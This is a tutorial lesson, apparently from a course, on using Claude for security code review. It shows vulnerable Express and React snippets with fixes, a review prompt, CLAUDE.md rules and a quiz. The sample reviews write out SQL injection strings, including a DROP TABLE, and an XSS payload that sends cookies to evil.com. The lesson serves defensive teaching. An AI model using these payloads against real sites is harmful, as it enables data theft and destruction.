@@ -1,0 +1,324 @@
+---
+title: "Automated Security Code Review"
+slug: "security-review"
+order: 1
+difficulty: "expert"
+duration: 22
+tags: ["security", "code-review", "vulnerabilities", "owasp"]
+objectives:
+  - "Write OWASP Top 10 review prompts that catch real vulnerabilities"
+  - "Identify SQL injection, XSS, IDOR, and auth bypass in code"
+  - "Set up security review hooks in CLAUDE.md"
+  - "Manage false positives effectively"
+quiz:
+  - id: "sec-review-1"
+    question: "What is the most effective way to use Claude for security code review?"
+    type: "multiple-choice"
+    options:
+      - "Ask 'is this code secure?'"
+      - "Provide specific OWASP categories to check against, include the full code, and ask for line-by-line analysis with severity ratings"
+      - "Only review authentication code"
+      - "Run it once before deploying"
+    correct: 1
+    explanation: "Generic prompts get generic answers. Specifying OWASP categories gives Claude a concrete checklist to review against. Including full code (not snippets) lets Claude trace data flow across functions. Severity ratings help you prioritize fixes. This structured approach catches 3-5x more issues than 'is this code secure?'"
+  - id: "sec-review-2"
+    question: "Which vulnerability can Claude reliably detect by tracing user input through code?"
+    type: "multiple-choice"
+    options:
+      - "Physical security issues"
+      - "SQL injection, XSS, and path traversal — any vulnerability where untrusted input reaches a dangerous sink"
+      - "Network misconfigurations"
+      - "Hardware vulnerabilities"
+    correct: 1
+    explanation: "Claude excels at taint analysis — tracing where user input (sources) flows through code and whether it reaches dangerous operations (sinks) like SQL queries, HTML rendering, or file system calls without proper sanitization. This is exactly how SQL injection, XSS, and path traversal vulnerabilities work."
+  - id: "sec-review-3"
+    question: "How should you handle false positives from Claude's security reviews?"
+    type: "multiple-choice"
+    options:
+      - "Ignore all security findings"
+      - "Document them in your CLAUDE.md with context so Claude learns not to flag them in future reviews"
+      - "Remove the security review process"
+      - "Fix every finding regardless of accuracy"
+    correct: 1
+    explanation: "Add false positive patterns to your CLAUDE.md's security review section. For example: 'Our ORM parameterizes queries automatically — don't flag ORM .find() calls as SQL injection.' This reduces noise in future reviews while keeping the review process active for real issues."
+  - id: "sec-review-4"
+    question: "What OWASP Top 10 category covers Insecure Direct Object References (IDOR)?"
+    type: "multiple-choice"
+    options:
+      - "A01: Broken Access Control"
+      - "A03: Injection"
+      - "A07: Identification and Authentication Failures"
+      - "A09: Security Logging and Monitoring Failures"
+    correct: 0
+    explanation: "IDOR falls under A01: Broken Access Control. It occurs when an application uses user-supplied input to access objects directly without authorization checks — like changing /api/users/123 to /api/users/456 to access another user's data. Claude is excellent at spotting missing authorization checks in API routes."
+---
+
+## Why Claude for Security Review
+
+Static analysis tools catch pattern-based vulnerabilities — they're good at finding `eval()` or `innerHTML`. But they miss logic-level vulnerabilities: authorization bypasses, race conditions, insecure business logic. Claude understands code semantically. It traces data flow, understands authorization intent, and catches the vulnerabilities that scanners miss.
+
+I ran Claude against a production Express.js API alongside Semgrep and Snyk Code. Claude found 3 IDOR vulnerabilities and 1 auth bypass that neither tool flagged. The tools caught a hardcoded secret that Claude missed. The lesson: use them together.
+
+## The OWASP Top 10 Review Prompt
+
+This is my go-to prompt for security reviews. I've refined it across dozens of codebases:
+
+```
+Review this code for security vulnerabilities. Check specifically for:
+
+**A01 - Broken Access Control:**
+- Missing authorization checks on endpoints
+- IDOR (can user A access user B's data by changing IDs?)
+- Privilege escalation (can a regular user access admin functions?)
+- Missing CORS configuration
+
+**A02 - Cryptographic Failures:**
+- Sensitive data in plaintext (passwords, tokens, PII)
+- Weak hashing algorithms (MD5, SHA1 for passwords)
+- Hardcoded secrets or keys
+
+**A03 - Injection:**
+- SQL injection (string concatenation in queries)
+- NoSQL injection
+- Command injection (user input in shell commands)
+- XSS (user input rendered in HTML without escaping)
+
+**A04 - Insecure Design:**
+- Missing rate limiting on auth endpoints
+- No account lockout after failed attempts
+- Predictable resource identifiers
+
+**A07 - Auth Failures:**
+- Weak password requirements
+- Missing session invalidation on logout
+- JWT issues (no expiry, weak signing, algorithm confusion)
+
+For each finding:
+1. Severity: Critical / High / Medium / Low
+2. Exact location (file, line, function)
+3. What the vulnerability allows an attacker to do
+4. Concrete fix with code
+```
+
+## Real Vulnerability: SQL Injection
+
+Here's code I've seen in production (anonymized):
+
+```javascript
+// VULNERABLE
+app.get("/api/users/search", (req, res) => {
+  const { name } = req.query;
+  const query = `SELECT * FROM users WHERE name LIKE '%${name}%'`;
+  db.query(query, (err, results) => {
+    res.json(results);
+  });
+});
+```
+
+Claude's analysis:
+
+```
+**Critical: SQL Injection in /api/users/search**
+
+The `name` query parameter is concatenated directly into the SQL query
+without parameterization. An attacker can inject arbitrary SQL:
+
+  GET /api/users/search?name=' OR '1'='1' --
+  → SELECT * FROM users WHERE name LIKE '%' OR '1'='1' --%'
+
+This returns ALL users. Worse:
+
+  GET /api/users/search?name='; DROP TABLE users; --
+  → Deletes the users table
+
+**Fix:**
+```
+
+```javascript
+// FIXED — parameterized query
+app.get("/api/users/search", (req, res) => {
+  const { name } = req.query;
+  const query = "SELECT * FROM users WHERE name LIKE ?";
+  db.query(query, [`%${name}%`], (err, results) => {
+    res.json(results);
+  });
+});
+```
+
+## Real Vulnerability: IDOR
+
+This one is subtle and scanners almost never catch it:
+
+```javascript
+// VULNERABLE
+app.get("/api/invoices/:id", authenticate, (req, res) => {
+  const invoice = await Invoice.findById(req.params.id);
+  res.json(invoice);
+});
+```
+
+The authentication middleware confirms the user is logged in, but doesn't check if they own the invoice. User A can access User B's invoices by guessing IDs.
+
+Claude catches this:
+
+```
+**High: IDOR in /api/invoices/:id**
+
+The endpoint authenticates the user but doesn't verify they own the
+requested invoice. Any authenticated user can access any invoice by
+changing the ID parameter.
+
+**Fix:**
+```
+
+```javascript
+// FIXED — verify ownership
+app.get("/api/invoices/:id", authenticate, (req, res) => {
+  const invoice = await Invoice.findOne({
+    _id: req.params.id,
+    userId: req.user.id  // ensure the invoice belongs to the requester
+  });
+  
+  if (!invoice) {
+    return res.status(404).json({ error: "Invoice not found" });
+  }
+  
+  res.json(invoice);
+});
+```
+
+## Real Vulnerability: XSS
+
+```javascript
+// VULNERABLE — React component with dangerouslySetInnerHTML
+function Comment({ comment }) {
+  return (
+    <div className="comment">
+      <strong>{comment.author}</strong>
+      <div dangerouslySetInnerHTML={{ __html: comment.body }} />
+    </div>
+  );
+}
+```
+
+Claude's response:
+
+```
+**High: Stored XSS via dangerouslySetInnerHTML**
+
+If comment.body contains user-generated content and isn't sanitized
+server-side, an attacker can inject:
+
+  <img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
+
+This steals session cookies from every user who views the comment.
+
+**Fix — Option 1:** Use a sanitization library
+```
+
+```javascript
+import DOMPurify from "dompurify";
+
+function Comment({ comment }) {
+  return (
+    <div className="comment">
+      <strong>{comment.author}</strong>
+      <div dangerouslySetInnerHTML={{ 
+        __html: DOMPurify.sanitize(comment.body) 
+      }} />
+    </div>
+  );
+}
+```
+
+```
+**Fix — Option 2:** Don't use dangerouslySetInnerHTML at all
+```
+
+```javascript
+function Comment({ comment }) {
+  return (
+    <div className="comment">
+      <strong>{comment.author}</strong>
+      <p>{comment.body}</p> {/* React auto-escapes this */}
+    </div>
+  );
+}
+```
+
+## Setting Up Security Review in CLAUDE.md
+
+Add a security section to your project's CLAUDE.md:
+
+```markdown
+## Security Review Rules
+
+When reviewing code changes that touch these areas, always check for:
+
+### API Routes (src/app/api/**)
+- Every endpoint must have authorization middleware
+- User-specific data must verify ownership (no IDOR)
+- All database queries must use parameterized queries
+- Rate limiting on auth endpoints (login, register, reset-password)
+
+### Known False Positives
+- Our ORM (Prisma) parameterizes queries automatically — don't flag
+  prisma.findMany() as SQL injection
+- The sanitize() helper in src/lib/utils.ts is trusted — inputs
+  passed through it are safe for rendering
+- Admin routes in src/app/api/admin/** are protected by the
+  adminOnly middleware — don't flag as missing auth
+
+### When You Find a Vulnerability
+- Rate it: Critical / High / Medium / Low
+- Explain the attack scenario in plain language
+- Provide a concrete fix, not just "sanitize the input"
+- If Critical or High, say "SECURITY: DO NOT MERGE" at the top
+```
+
+## Continuous Security Review with Claude Code
+
+Set up a pre-commit or PR review workflow:
+
+```bash
+# Quick security scan before commit
+claude -p "Review the following git diff for security vulnerabilities. 
+Focus on: injection, auth bypass, IDOR, XSS, secrets exposure.
+Only report findings with High or Critical severity.
+$(git diff --cached)"
+```
+
+For a more thorough review:
+
+```bash
+# Full security audit of changed files
+claude -p "Perform a security audit of these files. Check against 
+OWASP Top 10. For each finding, provide severity, attack scenario, 
+and fix.
+
+Files changed:
+$(git diff --cached --name-only)
+
+Full diff:
+$(git diff --cached)"
+```
+
+## Managing False Positives
+
+Every security tool produces false positives. Track them:
+
+```markdown
+## Security Review — False Positive Log
+
+| Date | File | Finding | Why It's False | Resolution |
+|------|------|---------|----------------|------------|
+| 2026-01-15 | auth.ts | "Hardcoded secret" | It's a public OAuth client ID, not a secret | Added to CLAUDE.md known-safe list |
+| 2026-01-20 | db.ts | "SQL injection" | Prisma ORM auto-parameterizes | Added ORM note to CLAUDE.md |
+| 2026-02-01 | upload.ts | "Path traversal" | We validate against allowlist | Added comment in code explaining safety |
+```
+
+Over time, your CLAUDE.md's security section becomes a project-specific knowledge base that makes reviews more accurate.
+
+## Key Takeaway
+
+Claude catches logic-level vulnerabilities that static analysis tools miss — IDOR, auth bypasses, business logic flaws. Use the structured OWASP Top 10 prompt for comprehensive reviews. Always ask for severity ratings and concrete fixes, not generic advice. Set up security rules in your CLAUDE.md to reduce false positives and codify your project's security patterns. Combine Claude with traditional SAST tools for maximum coverage — they complement each other. The best security review catches vulns before they ship, and Claude makes that practical for every pull request.
